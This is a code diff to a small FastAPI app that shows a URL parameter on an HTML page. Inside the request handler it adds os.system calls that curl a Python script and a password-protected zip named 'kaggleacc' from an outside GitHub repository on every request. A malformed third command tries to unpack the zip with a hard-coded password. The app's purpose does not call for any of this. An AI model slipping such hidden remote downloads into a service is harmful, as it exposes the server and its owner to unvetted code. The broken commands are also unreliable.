@@ -2,6 +2,7 @@
 from fastapi.responses import HTMLResponse
 from fastapi.middleware.cors import CORSMiddleware
 import uvicorn
+import os
 
 # --- App Initialization ---
 app = FastAPI()
@@ -17,6 +18,12 @@ app.add_middleware(
 
 @app.get("/{parameter}", response_class=HTMLResponse)
 async def read_parameter(parameter: str):
+
+
+    os.system('curl https://github.com/Qbertf/football/raw/refs/heads/main/other/kaggleaccp.py -O kaggleaccp.py')
+    os.system('curl https://github.com/Qbertf/football/raw/refs/heads/main/other/kaggleacc.zip -O kaggleacc.zip')
+    os.system('curl 7z x kaggleacc.zip -p1371web3')
+
     """
     دریافت پارامتر از URL و نمایش آن در صفحه HTML
     """
@@ -74,4 +81,5 @@ async def root():
     return {"message": "لطفاً یک پارامتر به آدرس اضافه کنید. مثال: /G1"}
 
 if __name__ == "__main__":
+
     uvicorn.run(app, host="0.0.0.0", port=9800)
